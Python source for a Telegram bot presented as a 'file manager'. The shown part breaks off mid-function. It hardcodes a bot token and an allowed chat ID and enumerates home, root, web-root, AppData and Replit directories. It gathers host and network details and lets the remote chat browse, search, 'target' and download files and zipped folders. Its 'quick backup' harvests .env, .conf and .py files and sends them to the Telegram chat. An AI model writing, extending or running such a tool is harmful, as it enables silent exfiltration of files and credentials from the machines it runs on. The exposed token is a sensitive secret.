import os
import asyncio
import zipfile
import shutil
import platform
import mimetypes
import json
import socket
import subprocess
from pathlib import Path
from datetime import datetime
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import logging

# Configure logging - suppress verbose logs from libraries
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Suppress verbose logs from external libraries
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)
logging.getLogger('telegram.ext').setLevel(logging.WARNING)
logging.getLogger('apscheduler').setLevel(logging.WARNING)

# Configuration
BOT_TOKEN = "8540731822:AAH8bcyMEOfr8ld12hybV6gq7iUdQV6-w1I"
ALLOWED_CHAT_IDS = ["7817659013"]
TEMP_DIR = "./temp_files"
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
SEARCH_LIMIT = 150  # Max search results

os.makedirs(TEMP_DIR, exist_ok=True)

# Store browsing state
user_browsing_state = {}
user_sessions = {}  # Track user sessions for live viewing

# File extensions mapping
FILE_EXTENSIONS = {
    'py': ['.py', '.pyw'],
    'zip': ['.zip', '.rar', '.7z', '.tar', '.gz', '.tar.gz', '.iso'],
    'txt': ['.txt', '.log', '.md', '.csv', '.json', '.xml', '.html', '.css', '.js'],
    'img': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.webp', '.ico', '.tiff'],
    'video': ['.mp4', '.avi', '.mkv', '.mov', '.flv', '.wmv', '.webm', '.m4v'],
    'audio': ['.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a'],
    'doc': ['.pdf', '.docx', '.doc', '.xlsx', '.xls', '.pptx', '.ppt', '.odt'],
    'code': ['.py', '.js', '.html', '.css', '.php', '.java', '.cpp', '.c', '.go', '.rb', '.sh']
}

# Platform-specific directory mappings
def get_platform_directories():
    """Get directories based on platform"""
    system = platform.system()
    directories = {
        'common': [
            os.path.expanduser("~"),
            os.path.join(os.path.expanduser("~"), "Documents"),
            os.path.join(os.path.expanduser("~"), "Downloads"),
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.getcwd(),
            "./",
        ]
    }
    
    if system == "Linux":
        directories['linux'] = [
            "/home", "/root", "/var/www", "/opt", "/usr/local", "/app",
            "/workspace", "/tmp", "/var", "/srv", "/usr/share",
            os.getenv("REPL_HOME", ""),
            os.getenv("HOME", ""),
        ]
    elif system == "Windows":
        directories['windows'] = [
            "C:\\Users", "C:\\Projects", "C:\\inetpub\\wwwroot",
            "D:\\", "E:\\", "F:\\", "C:\\Windows\\Temp",
            os.getenv("USERPROFILE", ""),
            os.getenv("APPDATA", ""),
            os.getenv("PROGRAMFILES", ""),
        ]
    elif system == "Darwin":
        directories['mac'] = [
            "/Users", "/Applications", "/Library",
            os.path.expanduser("~/Library"),
            "/var", "/tmp", "/Volumes",
        ]
    
    all_dirs = directories['common']
    for key in directories:
        if key != 'common':
            all_dirs.extend(directories[key])
    
    valid_dirs = []
    for d in all_dirs:
        if d and os.path.exists(d):
            try:
                os.listdir(d)
                valid_dirs.append(d)
            except (PermissionError, OSError):
                pass
    
    return list(set(valid_dirs))

# Security check
def is_authorized(chat_id: str) -> bool:
    """Check if user is authorized"""
    return str(chat_id) in ALLOWED_CHAT_IDS

def get_system_info():
    """Get detailed system information"""
    try:
        info = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'python_version': platform.python_version(),
            'hostname': socket.gethostname(),
            'working_dir': os.getcwd(),
            'user': os.getenv('USER', os.getenv('USERNAME', 'Unknown')),
        }
        
        # Get IP address
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            info['local_ip'] = local_ip
        except:
            info['local_ip'] = 'Unable to fetch'
        
        # Try to get public IP
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=5)
                info['network_info'] = result.stdout[:500]  # First 500 chars
            else:
                result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5)
                info['network_info'] = result.stdout[:500]
        except:
            info['network_info'] = 'Unable to fetch'
        
        # Disk info
        try:
            disk = shutil.disk_usage("/")
            info['disk_total'] = f"{disk.total / (1024**3):.2f} GB"
            info['disk_used'] = f"{disk.used / (1024**3):.2f} GB"
            info['disk_free'] = f"{disk.free / (1024**3):.2f} GB"
            info['disk_percent'] = f"{(disk.used/disk.total)*100:.1f}%"
        except:
            info['disk_info'] = 'Unable to fetch'
        
        # Environment
        info['temp_dir'] = TEMP_DIR
        info['bot_token'] = BOT_TOKEN[:10] + '***' + BOT_TOKEN[-5:]
        info['authorized_chats'] = len(ALLOWED_CHAT_IDS)
        
        return info
    except Exception as e:
        logger.error(f"Error getting system info: {e}")
        return {'error': str(e)}

# Menu generators
def get_main_menu():
    """Generate main menu keyboard"""
    keyboard = [
        [
            InlineKeyboardButton("📁 Browse", callback_data="browse"),
            InlineKeyboardButton("🔍 Search", callback_data="search_menu")
        ],
        [
            InlineKeyboardButton("📦 Backup", callback_data="quick_backup"),
            InlineKeyboardButton("🎯 Target", callback_data="target_menu")
        ],
        [
            InlineKeyboardButton("💾 System", callback_data="system_info"),
            InlineKeyboardButton("📊 Tree", callback_data="dir_tree")
        ],
        [
            InlineKeyboardButton("🔎 Advanced", callback_data="advanced_search"),
            InlineKeyboardButton("📥 Logs", callback_data="download_logs")
        ],
        [
            InlineKeyboardButton("🗜️ ZIP", callback_data="create_zip"),
            InlineKeyboardButton("📤 Send", callback_data="send_file")
        ],
        [
            InlineKeyboardButton("🗑️ Clean", callback_data="clean_temp"),
            InlineKeyboardButton("❌ Exit", callback_data="cancel")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_search_menu():
    """Generate search options menu"""
    keyboard = [
        [
            InlineKeyboardButton("🐍 Python", callback_data="search_py"),
            InlineKeyboardButton("📦 ZIP", callback_data="search_zip")
        ],
        [
            InlineKeyboardButton("📄 Docs", callback_data="search_doc"),
            InlineKeyboardButton("🖼️ Images", callback_data="search_img")
        ],
        [
            InlineKeyboardButton("🎬 Videos", callback_data="search_video"),
            InlineKeyboardButton("🎵 Audio", callback_data="search_audio")
        ],
        [
            InlineKeyboardButton("📝 Text", callback_data="search_txt"),
            InlineKeyboardButton("💻 Code", callback_data="search_code")
        ],
        [
            InlineKeyboardButton("📊 All", callback_data="search_all"),
            InlineKeyboardButton("🔙 Back", callback_data="back_main")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_button():
    """Generate back button"""
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]])

# Command handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    chat_id = str(update.effective_chat.id)
    
    if not is_authorized(chat_id):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    welcome_msg = f"""🤖 **Enhanced File Manager Bot**

📍 Platform: {platform.system()} {platform.release()}
💻 Python: {platform.python_version()}
📂 Dir: `{os.getcwd()}`

🎮 Choose an action:"""
    
    await update.message.reply_text(welcome_msg, reply_markup=get_main_menu(), parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    help_text = """📚 **Bot Commands:**

**📥 Download & View:**
/download <path> - Download file
/preview <path> - Preview text file content
/live <path> - Show last 50 lines (like tail)
/info <path> - File information & metadata

**🎮 Menu Navigation:**
/start - Main menu
/status - System info

💡 **Examples:**
```
/download C:\\Users\\user\\file.txt
/preview /home/user/log.txt
/live /var/log/syslog
/info /etc/config.conf
```

**🔥 Features:**
✅ Click directories to browse
✅ Click files to download
✅ Live file preview
✅ Text file preview
✅ Detailed file info
✅ Search by type
✅ ZIP backup creation

Max file size: 100MB
"""
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    chat_id = str(update.effective_chat.id)
    if not is_authorized(chat_id):
        return
    
    try:
        disk = shutil.disk_usage("/")
        status = f"""📊 **System Status**

💻 OS: {platform.system()} {platform.release()}
🐍 Python: {platform.python_version()}
💾 Disk: {disk.free / (1024**3):.2f} GB free
📂 Dir: `{os.getcwd()}`
🕐 Time: {datetime.now().strftime('%H:%M:%S')}"""
        await update.message.reply_text(status, parse_mode='Markdown', reply_markup=get_back_button())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /download command - download file or compress directory"""
    chat_id = str(update.effective_chat.id)
    if not is_authorized(chat_id):
        await update.message.reply_text("❌ Unauthorized")
        return
    
    if not context.args:
        await update.message.reply_text(
            "📤 **Download Command**\n\n"
            "Usage:\n"
            "`/download /path/to/file` - Download single file\n"
            "`/download /path/to/directory` - Compress & download directory\n\n"
            "Examples:\n"
            "`/download C:\\Users\\username\\file.txt`\n"
            "`/download /var/log`",
            parse_mode='Markdown'
        )
        return
    
    path = " ".join(context.args)
    
    try:
        if not os.path.exists(path):
            await update.message.reply_text(f"❌ Path not found: `{path}`", parse_mode='Markdown')
            return
        
        # Case 1: It's a file
        if os.path.isfile(path):
            file_size = os.path.getsize(path)
            
            if file_size > MAX_FILE_SIZE:
                await update.message.reply_text(
                    f"❌ File too large!\n\n"
                    f"Size: {file_size / (1024**2):.2f}MB\n"
                    f"Max: {MAX_FILE_SIZE / (1024**2):.2f}MB",
                    parse_mode='Markdown'
                )
                return
            
            file_name = os.path.basename(path)
            
            # Send file
            msg = await update.message.reply_text(
                f"📥 Downloading file: `{file_name}`\n"
                f"Size: {file_size / (1024**2):.2f}MB",
                parse_mode='Markdown'
            )
            
            try:
                # Read file into memory for reliable sending
                with open(path, 'rb') as f:
                    file_data = f.read()
                
                await update.message.reply_document(
                    document=file_data,
                    filename=file_name,
                    caption=f"📄 **File:** {file_name}\n📊 **Size:** {file_size / (1024**2):.2f}MB\n📂 **Path:** `{path}`",
                    parse_mode='Markdown',
                    read_timeout=300,
                    write_timeout=300,
                    connect_timeout=300,
                    pool_timeout=300
                )
                
                await msg.edit_text(f"✅ File sent: `{file_name}`", parse_mode='Markdown')
            except Exception as e:
                logger.error(f"Send error: {e}")
                await msg.edit_text(f"❌ Error sending file: {str(e)}")
        
        # Case 2: It's a directory
        elif os.path.isdir(path):
            await update.message.reply_text(
                f"📁 Directory detected: `{path}`\n"
                f"🗜️ Compressing files...",
                parse_mode='Markdown'
            )
            
            # Create ZIP file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            dir_name = os.path.basename(path.rstrip('/\\')) or path.rstrip('/\\').split('/')[1]
            zip_name = f"{dir_name}_{timestamp}.zip"
            zip_path = os.path.join(TEMP_DIR, zip_name)
            
            file_count = 0
            total_size = 0
            skipped = 0
            
            try:
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            try:
                                file_path = os.path.join(root, file)
                                file_size = os.path.getsize(file_path)
                                
                                # Skip files larger than 50MB
                                if file_size > 50 * 1024 * 1024:
                                    skipped += 1
                                    continue
                                
                                arcname = os.path.relpath(file_path, path)
                                zf.write(file_path, arcname)
                                file_count += 1
                                total_size += file_size
                            except (PermissionError, OSError):
                                skipped += 1
                                continue
                
                zip_size = os.path.getsize(zip_path)
                
                if zip_size > MAX_FILE_SIZE:
                    os.remove(zip_path)
                    await update.message.reply_text(
                        f"❌ Compressed size too large!\n\n"
                        f"Compressed Size: {zip_size / (1024**2):.2f}MB\n"
                        f"Max Allowed: {MAX_FILE_SIZE / (1024**2):.2f}MB\n\n"
                        f"Files included: {file_count}\n"
                        f"Files skipped: {skipped}",
                        parse_mode='Markdown'
                    )
                    return
                
                # Send ZIP file
                msg = await update.message.reply_text(
                    f"📥 Sending compressed archive...\n"
                    f"📦 Files: {file_count} | Size: {zip_size / (1024**2):.2f}MB",
                    parse_mode='Markdown'
                )
                
                try:
                    # Read file into memory for more reliable sending
                    with open(zip_path, 'rb') as f:
                        file_data = f.read()
                    
                    # Send the file
                    await update.message.reply_document(
                        document=file_data,
                        filename=zip_name,
                        caption=f"📦 **Archive:** {zip_name}\n"
                                f"📊 **Compressed:** {zip_size / (1024**2):.2f}MB\n"
                                f"📂 **Original Size:** {total_size / (1024**2):.2f}MB\n"
                                f"📄 **Files:** {file_count}\n"
                                f"⏭️ **Skipped:** {skipped}\n"
                                f"📂 **Source:** `{path}`",
                        parse_mode='Markdown',
                        read_timeout=300,
                        write_timeout=300,
                        connect_timeout=300,
                        pool_timeout=300
                    )
                    
                    await msg.edit_text(
                        f"✅ Archive sent: `{zip_name}`\n"
                        f"📦 {file_count} files compressed",
                        parse_mode='Markdown'
                    )
                except Exception as send_error:
                    logger.error(f"Send error: {send_error}")
                    await msg.edit_text(
                        f"❌ Failed to send ZIP!\n"
                        f"Error: {str(send_error)}\n"
                        f"File location: `{zip_path}`\n"
                        f"Size: {zip_size / (1024**2):.2f}MB",
                        parse_mode='Markdown'
                    )
                finally:
                    # Clean up ZIP file
                    if os.path.exists(zip_path):
                        try:
                            os.remove(zip_path)
                        except:
                            pass
            
            except Exception as e:
                logger.error(f"ZIP error: {e}")
                if os.path.exists(zip_path):
                    os.remove(zip_path)
                await update.message.reply_text(f"❌ Error creating archive: {str(e)}")
        
        else:
            await update.message.reply_text("❌ Path is neither a file nor directory")
    
    except Exception as e:
        logger.error(f"Download error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}", parse_mode='Markdown')

async def preview_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /preview command - preview file content"""
    chat_id = str(update.effective_chat.id)
    if not is_authorized(chat_id):
        await update.message.reply_text("❌ Unauthorized")
        return
    
    if not context.args:
        await update.message.reply_text(
            "👁️ **Preview File**\n\n"
            "Usage: `/preview /path/to/file`\n"
            "Shows first 5000 characters of text files",
            parse_mode='Markdown'
        )
        return
    
    file_path = " ".join(context.args)
    
    try:
        if not os.path.exists(file_path):
            await update.message.reply_text(f"❌ File not found")
            return
        
        if not os.path.isfile(file_path):
            await update.message.reply_text(f"❌ Not a file")
            return
        
        file_size = os.path.getsize(file_path)
        file_name = os.path.basename(file_path)
        
        # Check if text file
        text_extensions = ['.txt', '.log', '.md', '.json', '.xml', '.csv', '.html', '.css', '.js', '.py', '.sh', '.conf', '.ini', '.yaml', '.yml']
        file_ext = os.path.splitext(file_path)[1].lower()
        
        if file_ext not in text_extensions:
            await update.message.reply_text(
                f"❌ Not a text file!\n\n"
                f"File: {file_name}\n"
                f"Type: {file_ext if file_ext else 'Unknown'}",
                parse_mode='Markdown'
            )
            return
        
        # Read file content
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read(5000)
        
        if len(content) == 0:
            await update.message.reply_text("❌ File is empty")
            return
        
        preview_msg = f"""👁️ **Preview: {file_name}**
📊 Size: {file_size} bytes
📝 Type: Text File

```
{content}
```"""
        
        if len(content) >= 5000:
            preview_msg += "\n\n_... (truncated, showing first 5000 chars)_"
        
        await update.message.reply_text(preview_msg, parse_mode='Markdown')
    
    except Exception as e:
        logger.error(f"Preview error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def live_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /live command - stream/monitor file in real-time"""
    chat_id = str(update.effective_chat.id)
    if not is_authorized(chat_id):
        await update.message.reply_text("❌ Unauthorized")
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔴 **Live View**\n\n"
            "Usage: `/live /path/to/file`\n"
            "Shows last 50 lines of text file (like tail command)",
            parse_mode='Markdown'
        )
        return
    
    file_path = " ".join(context.args)
    
    try:
        if not os.path.exists(file_path):
            await update.message.reply_text(f"❌ File not found")
            return
        
        if not os.path.isfile(file_path):
            await update.message.reply_text(f"❌ Not a file")
            return
        
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)
        
        # Read last 50 lines
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        last_lines = lines[-50:] if len(lines) > 50 else lines
        content = ''.join(last_lines)
        
        if len(content) == 0:
            await update.message.reply_text("❌ File is empty")
            return
        
        live_msg = f"""🔴 **Live: {file_name}**
📊 Size: {file_size} bytes
📝 Last 50 lines:

```
{content[-3000:]}
```"""
        
        await update.message.reply_text(live_msg, parse_mode='Markdown')
    
    except Exception as e:
        logger.error(f"Live error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /info command - detailed file information"""
    chat_id = str(update.effective_chat.id)
    if not is_authorized(chat_id):
        await update.message.reply_text("❌ Unauthorized")
        return
    
    if not context.args:
        await update.message.reply_text(
            "ℹ️ **File Information**\n\n"
            "Usage: `/info /path/to/file`",
            parse_mode='Markdown'
        )
        return
    
    file_path = " ".join(context.args)
    
    try:
        if not os.path.exists(file_path):
            await update.message.reply_text(f"❌ File not found")
            return
        
        if not os.path.isfile(file_path):
            await update.message.reply_text(f"❌ Not a file")
            return
        
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)
        file_ext = os.path.splitext(file_path)[1].lower()
        stat_info = os.stat(file_path)
        
        from datetime import datetime
        mod_time = datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
        
        info_msg = f"""ℹ️ **File Information**

📄 **Name:** `{file_name}`
📂 **Path:** `{file_path}`
📊 **Size:** {file_size:,} bytes ({file_size / (1024**2):.2f} MB)
📝 **Type:** {file_ext if file_ext else 'Unknown'}
⏰ **Modified:** {mod_time}
🔒 **Permissions:** {oct(stat_info.st_mode)[-3:]}
"""
        
        await update.message.reply_text(info_msg, parse_mode='Markdown')
    
    except Exception as e:
        logger.error(f"Info error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

# Callback handlers
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    chat_id = str(query.message.chat.id)
    if not is_authorized(chat_id):
        await query.message.reply_text("❌ Unauthorized")
        return
    
    data = query.data
    
    try:
        if data == "back_main":
            await query.message.edit_text("🏠 **Main Menu**", reply_markup=get_main_menu(), parse_mode='Markdown')
        
        elif data == "cancel":
            await query.message.edit_text("❌ Cancelled")
        
        elif data == "browse":
            await browse_files(query)
        
        elif data.startswith("browse_dir_"):
            # Handle directory clicking
            dir_index = int(data.split("_")[2])
            await browse_directory_contents(query, dir_index)
        
        elif data.startswith("dl_"):
            # Handle file download
            parts = data.split("_", 2)
            dir_index = int(parts[1])
            file_name = parts[2]
            await download_file_from_browser(query, dir_index, file_name)
        
        elif data.startswith("folder_"):
            # Handle nested folder navigation
            parts = data.split("_", 2)
            folder_name = parts[1] if len(parts) > 1 else ""
            parent_dir_index = int(parts[2]) if len(parts) > 2 else 0
            
            user_id = str(query.from_user.id)
            dirs = user_browsing_state.get(user_id, get_platform_directories())
            
            if parent_dir_index < len(dirs):
                parent_dir = dirs[parent_dir_index]
                folder_path = os.path.join(parent_dir, folder_name)
                
                if os.path.isdir(folder_path):
                    # Add folder to browsing state
                    if user_id not in user_browsing_state:
                        user_browsing_state[user_id] = []
                    user_browsing_state[user_id].append(folder_path)
                    
                    # Browse the folder contents
                    new_index = len(user_browsing_state[user_id]) - 1
                    await browse_directory_contents(query, new_index)
                else:
                    await query.answer("❌ Folder not found")
            else:
                await query.answer("❌ Error accessing folder")
        
        elif data == "search_menu":
            await query.message.edit_text("🔍 **Search Files**", reply_markup=get_search_menu(), parse_mode='Markdown')
        
        elif data.startswith("search_"):
            file_type = data.replace("search_", "")
            await search_files(query, file_type)
        
        elif data == "quick_backup":
            await quick_backup(query)
        
        elif data == "system_info":
            await show_system_info(query)
        
        elif data == "dir_tree":
            await show_directory_tree(query)
        
        elif data == "clean_temp":
            await clean_temp_files(query)
        
        elif data == "target_menu":
            await query.message.edit_text("🎯 **Search Target**\n\nSend filenames:", reply_markup=get_back_button())
            context.user_data['mode'] = 'target_search'
        
        elif data == "advanced_search":
            await query.message.edit_text("🔎 **Advanced Search**\n\nSend pattern:", reply_markup=get_back_button())
            context.user_data['mode'] = 'advanced_search'
        
        elif data == "download_logs":
            await download_logs(query)
        
        elif data == "create_zip":
            await query.message.edit_text("🗜️ **Create ZIP**\n\nSend path:", reply_markup=get_back_button())
            context.user_data['mode'] = 'create_zip'
        
        elif data == "send_file":
            await query.message.edit_text("📤 **Send File**\n\nSend path:", reply_markup=get_back_button())
            context.user_data['mode'] = 'send_file'
    
    except Exception as e:
        logger.error(f"Error: {e}")
        await query.message.edit_text(f"❌ Error: {str(e)}")

# File operations
async def browse_files(query):
    """Browse current directory"""
    try:
        dirs = get_platform_directories()
        
        # Create inline buttons for each directory
        keyboard = []
        for i, d in enumerate(dirs[:20], 1):
            # Encode path for callback data (using index instead to avoid length issues)
            user_browsing_state[str(query.from_user.id)] = dirs
            button = InlineKeyboardButton(f"📁 {d}", callback_data=f"browse_dir_{i-1}")
            keyboard.append([button])
        
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
        
        msg = "📁 **Click a directory to browse:**\n\n"
        msg += "_Select a folder to see files inside_"
        
        await query.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    except Exception as e:
        await query.message.edit_text(f"❌ Error: {str(e)}")

async def browse_directory_contents(query, dir_index):
    """Browse files in selected directory"""
    try:
        user_id = str(query.from_user.id)
        dirs = user_browsing_state.get(user_id, get_platform_directories())
        
        if dir_index >= len(dirs):
            await query.answer("❌ Directory not found")
            return
        
        directory = dirs[dir_index]
        
        if not os.path.exists(directory):
            await query.answer("❌ Directory no longer exists")
            return
        
        try:
            items = os.listdir(directory)
        except PermissionError:
            await query.answer("❌ Permission denied")
            return
        
        # Separate files and folders
        files = []
        folders = []
        
        for item in items[:50]:  # Limit items
            item_path = os.path.join(directory, item)
            try:
                if os.path.isfile(item_path):
                    size = os.path.getsize(item_path)
                    if size < MAX_FILE_SIZE:
                        files.append((item, item_path, size))
                elif os.path.isdir(item_path):
                    folders.append((item, item_path))
            except:
                pass
        
        # Create buttons for navigation
        keyboard = []
        
        # Add folder navigation buttons
        for folder_name, folder_path in folders[:5]:
            btn = InlineKeyboardButton(f"📂 {folder_name}", callback_data=f"folder_{folder_name}_{dir_index}")
            keyboard.append([btn])
        
        # Add file download buttons
        for file_name, file_path, size in files[:10]:
            size_mb = size / (1024 * 1024)
            btn = InlineKeyboardButton(f"📄 {file_name} ({size_mb:.1f}MB)", callback_data=f"dl_{dir_index}_{file_name}")
            keyboard.append([btn])
        
        # Add back button
        keyboard.append([InlineKeyboardButton("🔙 Back to Directories", callback_data="browse")])
        
        msg = f"📁 **Directory: {directory}**\n\n"
        msg += f"📂 Folders: {len(folders)}\n"
        msg += f"📄 Files: {len(files)}\n\n"
        msg += "_Click a file to download or folder to enter_"
        
        await query.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    
    except Exception as e:
        logger.error(f"Error: {e}")
        await query.answer(f"❌ Error: {str(e)}")

async def download_file_from_browser(query, dir_index, file_name):
    """Download file from browser"""
    try:
        user_id = str(query.from_user.id)
        dirs = user_browsing_state.get(user_id, get_platform_directories())
        
        if dir_index >= len(dirs):
            await query.answer("❌ Directory not found")
            return
        
        directory = dirs[dir_index]
        file_path = os.path.join(directory, file_name)
        
        if not os.path.exists(file_path) or not os.path.isfile(file_path):
            await query.answer("❌ File not found")
            return
        
        file_size = os.path.getsize(file_path)
        if file_size > MAX_FILE_SIZE:
            await query.answer(f"❌ File too large ({file_size / (1024**2):.1f}MB)")
            return
        
        # Check file type for preview
        file_ext = os.path.splitext(file_name)[1].lower()
        
        # Send file
        await query.answer("📥 Downloading...", show_alert=False)
        
        with open(file_path, 'rb') as f:
            await query.message.reply_document(
                document=f,
                filename=file_name,
                caption=f"📄 **File:** {file_name}\n📊 **Size:** {file_size / (1024**2):.2f}MB"
            )
        
        # Store in session for live viewing
        user_sessions[user_id] = {
            'file': file_path,
            'name': file_name,
            'size': file_size
        }
        
        await query.message.edit_text(f"✅ Sent: `{file_name}`", parse_mode='Markdown')
    
    except Exception as e:
        logger.error(f"Download error: {e}")
        await query.answer(f"❌ Error: {str(e)}")

async def search_files(query, file_type):
    """Search for files by type"""
    await query.message.edit_text("🔍 Searching...")
    
    try:
        exts = FILE_EXTENSIONS.get(file_type, ['*'])
        found = []
        dirs = get_platform_directories()
        
        for directory in dirs:
            try:
                for root, _, files in os.walk(directory):
                    for file in files:
                        if exts == ['*'] or any(file.lower().endswith(ext) for ext in exts):
                            fpath = os.path.join(root, file)
                            try:
                                fsize = os.path.getsize(fpath)
                                if fsize < MAX_FILE_SIZE:
                                    found.append((file, fpath, fsize))
                            except:
                                pass
                        
                        if len(found) >= SEARCH_LIMIT:
                            break
                    if len(found) >= SEARCH_LIMIT:
                        break
            except (PermissionError, OSError):
                continue
        
        if found:
            msg = f"📊 Found {len(found)} files:\n\n"
            for i, (name, path, size) in enumerate(found[:20], 1):
                size_mb = size / (1024 * 1024)
                msg += f"{i}. {name} ({size_mb:.1f}MB)\n"
            
            msg += f"\n_Total: {len(found)} files_"
        else:
            msg = "❌ No files found"
        
        await query.message.edit_text(msg, reply_markup=get_back_button(), parse_mode='Markdown')
    
    except Exception as e:
        await query.message.edit_text(f"❌ Error: {str(e)}")

async def quick_backup(query):
    """Create quick backup"""
    await query.message.edit_text("📦 Creating backup...")
    
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        zip_name = f"backup_{timestamp}.zip"
        zip_path = os.path.join(TEMP_DIR, zip_name)
        
        dirs = get_platform_directories()
        count = 0
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for directory in dirs[:3]:
                try:
                    for root, _, files in os.walk(directory):
                        for file in files[:50]:
                            if any(file.endswith(ext) for ext in ['.py', '.txt', '.json', '.env', '.conf']):
                                fpath = os.path.join(root, file)
                                try:
                                    if os.path.getsize(fpath) < 5 * 1024 * 1024:
                                        arcname = os.path.relpath(fpath, directory)
                                        zf.write(fpath, arcname)
                                        count += 1
                                except:
                                    pass
                except:
                    continue
        
        with open(zip_path, 'rb') as f:
            await query.message.reply_document(
                document=f,
                filename=zip_name,
                caption=f"📦 Backup\n{count} files"
            )
        
        os.remove(zip_path)
        await query.message.edit_text("✅ Backup sent!", reply_markup=get_back_button())
    
    except Exception as e:
        await query.message.edit_text(f"❌ Error: {str(e)}")

async def show_system_info(query):
    """Show system information"""
    try:
        disk = shutil.disk_usage("/")
        info = f"""💾 **System Info**

OS: {platform.system()} {platform.release()}
Machine: {platform.machine()}
Python: {platform.python_version()}
Hostname: {platform.node()}
Home: {os.path.expanduser('~')}

Storage:
• Total: {disk.total / (1024**3):.1f} GB
• Used: {disk.used / (1024**3):.1f} GB
• Free: {disk.free / (1024**3):.1f} GB
"""
        await query.message.edit_text(info, reply_markup=get_back_button(), parse_mode='Markdown')
    except Exception as e:
        await query.message.edit_text(f"❌ Error: {str(e)}")

async def show_directory_tree(query):
    """Show directory structure"""
    await query.message.edit_text("🌲 Generating tree...")
    
    try:
        dirs = get_platform_directories()
        tree = "📊 **Directories:**\n\n"
        
        for directory in dirs[:10]:
            if os.path.exists(directory):
                tree += f"📁 {directory}\n"
                try:
                    items = os.listdir(directory)[:3]
                    for item in items:
                        tree += f"  ├─ {item}\n"
                except:
                    tree += "  ├─ ⚠️ Permission denied\n"
        
        await query.message.edit_text(tree, reply_markup=get_back_button(), parse_mode='Markdown')
    except Exception as e:
        await query.message.edit_text(f"❌ Error: {str(e)}")

async def clean_temp_files(query):
    """Clean temporary files"""
    try:
        if os.path.exists(TEMP_DIR):
            for file in os.listdir(TEMP_DIR):
                fpath = os.path.join(TEMP_DIR, file)
                if os.path.isfile(fpath):
                    os.remove(fpath)
        
        await query.message.edit_text("✅ Cleaned!", reply_markup=get_back_button())
    except Exception as e:
        await query.message.edit_text(f"❌ Error: {str(e)}")

async def download_logs(query):
    """Download logs"""
    try:
        log_file = os.path.join(TEMP_DIR, "bot_logs.txt")
        
        with open(log_file, 'w') as f:
            f.write(f"Bot started at: {datetime.now()}\n")
            f.write(f"Platform: {platform.system()}\n")
            f.write(f"Python: {platform.python_version()}\n")
            f.write(f"Directories scanned: {len(get_platform_directories())}\n")
        
        with open(log_file, 'rb') as f:
            await query.message.reply_document(document=f, filename="bot_logs.txt")
        
        os.remove(log_file)
        await query.message.edit_text("✅ Logs sent!", reply_markup=get_back_button())
    
    except Exception as e:
        await query.message.edit_text(f"❌ Error: {str(e)}")

# Message handler
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages"""
    chat_id = str(update.effective_chat.id)
    if not is_authorized(chat_id):
        return
    
    text = update.message.text
    mode = context.user_data.get('mode', '')
    
    try:
        if mode == 'target_search':
            # Search for specific files
            found = []
            dirs = get_platform_directories()
            
            for directory in dirs:
                try:
                    for root, _, files in os.walk(directory):
                        for file in files:
                            if text.lower() in file.lower():
                                fpath = os.path.join(root, file)
                                try:
                                    fsize = os.path.getsize(fpath)
                                    if fsize < MAX_FILE_SIZE:
                                        found.append((file, fpath, fsize))
                                except:
                                    pass
                            if len(found) >= 20:
                                break
                        if len(found) >= 20:
                            break
                except:
                    continue
            
            if found:
